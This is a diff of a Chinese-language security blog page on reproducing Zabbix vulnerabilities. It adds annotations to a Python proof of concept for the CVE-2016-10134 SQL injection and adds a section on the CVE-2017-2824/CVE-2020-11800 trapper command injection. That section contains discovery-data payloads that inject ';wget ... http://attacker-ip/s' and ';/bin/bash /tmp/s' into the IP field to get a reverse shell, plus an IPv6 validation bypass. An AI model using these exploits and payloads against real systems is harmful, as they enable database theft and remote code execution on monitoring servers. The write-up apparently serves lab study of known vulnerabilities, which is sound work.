@@ -49,7 +49,7 @@
         content="2022-07-25">
       <meta 
         property="og:article:modified_time" 
-        content="2022-07-25">
+        content="2022-08-03">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -329,7 +329,7 @@
     
     
       <span class="dot"></span>
-      <span>701 words</span>
+      <span>1.5k words</span>
     
   </div>
   
@@ -377,8 +377,6 @@ http://192.168.35.131:8080/jsrpc.php?type<span class="token operator">=</span><s
 
 //Respone
 <span class="token operator">&lt;</span>ul<span class="token operator">></span><span class="token operator">&lt;</span>li<span class="token operator">></span>Error <span class="token keyword">in</span> query <span class="token punctuation">[</span>INSERT INTO profiles <span class="token punctuation">(</span>profileid, userid, idx, value_int, type, idx2<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span><span class="token number">12</span>, <span class="token number">2</span>, <span class="token string">'web.item.graph.period'</span>, <span class="token string">'3600'</span>, <span class="token number">2</span>, updatexml<span class="token punctuation">(</span><span class="token number">0</span>,concat<span class="token punctuation">(</span>0xa,user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0<span class="token punctuation">))</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>XPATH syntax error: <span class="token string">'&lt;/li>&lt;li>root@192.168.0.4'</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>/li<span class="token operator">></span><span class="token operator">&lt;</span>li<span class="token operator">></span>Error <span class="token keyword">in</span> query <span class="token punctuation">[</span>INSERT INTO profiles <span class="token punctuation">(</span>profileid, userid, idx, value_str, type, idx2<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span><span class="token number">13</span>, <span class="token number">2</span>, <span class="token string">'web.item.graph.stime'</span>, <span class="token string">'20220725134554'</span>, <span class="token number">3</span>, updatexml<span class="token punctuation">(</span><span class="token number">0</span>,concat<span class="token punctuation">(</span>0xa,user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0<span class="token punctuation">))</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>XPATH syntax error: <span class="token string">'&lt;/li>&lt;li>root@192.168.0.4'</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>/li<span class="token operator">></span><span class="token operator">&lt;</span>li<span class="token operator">></span>Error <span class="token keyword">in</span> query <span class="token punctuation">[</span>INSERT INTO profiles <span class="token punctuation">(</span>profileid, userid, idx, value_int, type, idx2<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span><span class="token number">14</span>, <span class="token number">2</span>, <span class="token string">'web.item.graph.isnow'</span>, <span class="token string">'1'</span>, <span class="token number">2</span>, updatexml<span class="token punctuation">(</span><span class="token number">0</span>,concat<span class="token punctuation">(</span>0xa,user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0<span class="token punctuation">))</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>XPATH syntax error: <span class="token string">'&lt;/li>&lt;li>root@192.168.0.4'</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>/li<span class="token operator">></span><span class="token operator">&lt;</span>/ul<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>POC CVE-2016-10134:<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
-<span class="token comment"># @Time    : 2021/12/23</span>
-<span class="token comment"># @Author  : TesterCC</span>
 
 <span class="token keyword">import</span> json
 
@@ -402,12 +400,12 @@ ss<span class="token punctuation">.</span>headers <span class="token operator">=
 <span class="token comment"># python3 CVE-2016-10134.py --target 127.0.0.1:8080</span>
 
 <span class="token keyword">def</span> <span class="token function">get_payload1</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
-   payload <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"\[(.*\))\]"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>
+   payload <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"\[(.*\))\]"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span> <span class="token operator">//</span>正则匹配 <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 
 
 <span class="token keyword">def</span> <span class="token function">get_sql_injection_info</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
-   sql_injection_info <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"&lt;\/li>&lt;li>(.*)\'\]"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>
+   sql_injection_info <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"&lt;\/li>&lt;li>(.*)\'\]"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>  <span class="token operator">//</span>正则匹配 <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">)</span>'<span class="token punctuation">]</span>
    <span class="token keyword">return</span> sql_injection_info<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 
 
@@ -419,7 +417,7 @@ ss<span class="token punctuation">.</span>headers <span class="token operator">=
 
    cookie_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>i<span class="token punctuation">.</span>name<span class="token punctuation">:</span> i<span class="token punctuation">.</span>value <span class="token keyword">for</span> i <span class="token keyword">in</span> ret0<span class="token punctuation">.</span>cookies<span class="token punctuation">&#125;</span>
    <span class="token comment"># get sid</span>
-   sid <span class="token operator">=</span> cookie_dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'zbx_sessionid'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+   sid <span class="token operator">=</span> cookie_dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'zbx_sessionid'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">//</span>取 zbx_sessionid 末<span class="token number">16</span>位
 
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"sid"</span><span class="token punctuation">:</span> sid<span class="token punctuation">,</span>
            <span class="token string">"form_refresh"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
@@ -427,7 +425,7 @@ ss<span class="token punctuation">.</span>headers <span class="token operator">=
            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
            <span class="token string">"enter"</span><span class="token punctuation">:</span> <span class="token string">"Sign+in"</span><span class="token punctuation">&#125;</span>
 
-   retn <span class="token operator">=</span> ss<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>login_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>ss<span class="token punctuation">.</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+   retn <span class="token operator">=</span> ss<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>login_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>ss<span class="token punctuation">.</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span> <span class="token operator">//</span>以空账号密码登陆 target
    <span class="token keyword">if</span> retn<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token comment"># updatexml(0,concat(0xa,database()),0)</span>
        <span class="token comment"># updatexml(0,concat(0xa,version()),0)</span>
@@ -471,7 +469,31 @@ ss<span class="token punctuation">.</span>headers <span class="token operator">=
 
 
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-   main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+   main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+</blockquote>
+<h2 id="2-Zabbix_Server_trapper_u547D_u4EE4_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2017-2824_uFF09_28CVE-2020-11800_29"><a href="#2-Zabbix_Server_trapper_u547D_u4EE4_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2017-2824_uFF09_28CVE-2020-11800_29" class="headerlink" title="2.Zabbix Server trapper命令注入漏洞（CVE-2017-2824）(CVE-2020-11800)"></a>2.Zabbix Server trapper命令注入漏洞（CVE-2017-2824）(CVE-2020-11800)</h2><p><strong><font color=green>影响版本 : Zabbix 2.4.7 - 2.4.8r1 &amp; Zabbix 3.0.x - 3.0.30</font></strong><br><strong><font color=green>Path : zabbix/CVE-2017-2824:/CVE-2020-11800</font></strong><br><strong><font color=green>Vul : 命令执行</font></strong>  </p>
+<blockquote>
+<p><strong>Breakthrough</strong><br>该漏洞位于Zabbix中<code>Trapper</code>代码部分，它主要提供Proxies和Server之间通信的服务（TCP端口10051）。Zabbix Server向Zabbix Proxy提供一组API的调用，其中需要关注的是<code>command requests</code>和<code>discovery data</code>。这些请求的示例数据如下所示：<br><pre class="line-numbers language-html" data-language="html"><code class="language-html">&#123;"request":"command","scriptid":1,"hostid":10001&#125;
+&#123;"request":"discovery data","host":"zabbix-proxy.com","clock":10,"data":[&#123;"clock":10,"drule":1,"dcheck":2,"type":0,"ip":10.0.0.1,"dns":"zabbix-agent.com","port":10050,"key":"test","status":0,"value":"test_value"&#125;]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><code>request</code>命令调用位于Zabbix数据库中的脚本，并且不进行任何身份验证。<br>同时，默认情况下Zabbix 2.4.X 调用 script table 中的3个script来填充mysql数据库：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">scriptid <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">==</span> /bin/ping -c <span class="token punctuation">&#123;</span>HOST.CONN<span class="token punctuation">&#125;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>
+scriptid <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">==</span> /usr/bin/traceroute <span class="token punctuation">&#123;</span>HOST.CONN<span class="token punctuation">&#125;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>
+scriptid <span class="token operator">==</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token function">sudo</span> /usr/bin/nmap -O <span class="token punctuation">&#123;</span>HOST.CONN<span class="token punctuation">&#125;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>在调用脚本时，<strong>{HOST.CONN}</strong>字段会被<strong>host的IP地址</strong>替换。替换{HOST.CONN}的值<strong>（主机的IP地址）</strong>位于Zabbix的<code>interface</code>表中，然后保存成<strong>VARCHAR(64)类型的IP字段</strong>。<br>因此，如果创建一个<strong>命令注入payload作为IP地址</strong>保存在<code>interface</code>表中，并通过请求运行带有<strong>{HOST.CONN}</strong>的脚本，则会发生命令注入。<br>以上的执行前提是获得一个有效的入口进入Zabbix的<code>host</code>表。该行为需要Zabbix的管理员权限，使用Zabbix的<code>Auto-discovery</code>功能。<br>Zabbix的<code>Auto-discovery</code>功能和<code>Auto-registration</code>功能能够将Zabbix Proxy向Zabbix Server提供的数据作为Zabbix Server的配置。即，如果host向Zabbix Proxy提供某些特征数据，则由于上述特性，Zabbix Server将可能执行某些操作，其中可能会导致近期discovered主机被添加到Zabbix的某些数据库表中。当这种情况发生时。一个<strong>host</strong>会被插入到Zabbix的<code>hosts</code>表和<code>interface</code>表中，该<strong>host提供的IP地址</strong>会被插入到<code>interface</code>表的IP字段，并且<strong>不会对该IP地址进行任何验证</strong>。<br>综上所述，通过向Zabbix Server发送<code>discovery data</code>请求包含一个带有命令注入payload的host，就可以将命令注入payload插入到Zabbix数据库中：<br><pre class="line-numbers language-html" data-language="html"><code class="language-html">write_script_cmd='&#123;
+   "request":"discovery data",
+   "host":"zabbix-proxy.domain.fake",
+   "clock":148535399,
+   "data":[&#123;
+       "clock":1485353070,
+       "drule":88,
+       "dcheck":174,
+       "type":0,
+       "ip":";wget -O /tmp/s http://attacker-ip/s;#", //携带命令注入payload的ip地址参数
+       "dns":"host28.domain.fake",
+       "port":10050,
+       "key":"sectest",
+       "status":0,
+       "value":"cyy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>(^^)</span><span class="token punctuation">></span></span>host"
+   &#125;]
+&#125;'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>由于Zabbix的<code>interface</code>表的ip字段存在大小限制VARCHAR(64)，第二个host被插入到另一个ip地址的表中。<br><pre class="line-numbers language-html" data-language="html"><code class="language-html">// Host 2
+"ip":";/bin/bash /tmp/s;#"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>当两个host均被插入后，需要知道<code>command requests</code>的<code>hostid</code>。由于host存在与否的响应不同，可以通过暴力回溯数据库来获取携带命令注入payload的host的hostid，并调用<code>command request</code>后，则能够得到一个反射shell。<br>(CVE-2017-2824)修复后，对传入的ip地址参数做了格式校验。(CVE-2020-11800)在其基础上，由于ipv6的检验存在漏洞，故能够通过以下payload进行绕过：<br><pre class="line-numbers language-html" data-language="html"><code class="language-html">"ip":"ffff:::;touch /tmp/success" // /tmp目录新增文件success<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 </blockquote>
 
   </div>
@@ -529,7 +551,7 @@ ss<span class="token punctuation">.</span>headers <span class="token operator">=
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u573A_u642D_u5EFA"><span class="toc-text">0.靶场搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Zabbix_SQL_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2016-10134_uFF09"><span class="toc-text">1.Zabbix SQL注入漏洞（CVE-2016-10134）</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u573A_u642D_u5EFA"><span class="toc-text">0.靶场搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Zabbix_SQL_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2016-10134_uFF09"><span class="toc-text">1.Zabbix SQL注入漏洞（CVE-2016-10134）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Zabbix_Server_trapper_u547D_u4EE4_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2017-2824_uFF09_28CVE-2020-11800_29"><span class="toc-text">2.Zabbix Server trapper命令注入漏洞（CVE-2017-2824）(CVE-2020-11800)</span></a></li></ol>
 </div></main>
             <aside class="left-column">
               
@@ -593,7 +615,7 @@ ss<span class="token punctuation">.</span>headers <span class="token operator">=
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u573A_u642D_u5EFA"><span class="toc-text">0.靶场搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Zabbix_SQL_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2016-10134_uFF09"><span class="toc-text">1.Zabbix SQL注入漏洞（CVE-2016-10134）</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u573A_u642D_u5EFA"><span class="toc-text">0.靶场搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Zabbix_SQL_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2016-10134_uFF09"><span class="toc-text">1.Zabbix SQL注入漏洞（CVE-2016-10134）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Zabbix_Server_trapper_u547D_u4EE4_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2017-2824_uFF09_28CVE-2020-11800_29"><span class="toc-text">2.Zabbix Server trapper命令注入漏洞（CVE-2017-2824）(CVE-2020-11800)</span></a></li></ol>
       </div>
     </article>
   
@@ -771,7 +793,7 @@ ss<span class="token punctuation">.</span>headers <span class="token operator">=
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u573A_u642D_u5EFA"><span class="toc-text">0.靶场搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Zabbix_SQL_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2016-10134_uFF09"><span class="toc-text">1.Zabbix SQL注入漏洞（CVE-2016-10134）</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u573A_u642D_u5EFA"><span class="toc-text">0.靶场搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Zabbix_SQL_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2016-10134_uFF09"><span class="toc-text">1.Zabbix SQL注入漏洞（CVE-2016-10134）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Zabbix_Server_trapper_u547D_u4EE4_u6CE8_u5165_u6F0F_u6D1E_uFF08CVE-2017-2824_uFF09_28CVE-2020-11800_29"><span class="toc-text">2.Zabbix Server trapper命令注入漏洞（CVE-2017-2824）(CVE-2020-11800)</span></a></li></ol>
     </article>
   
   
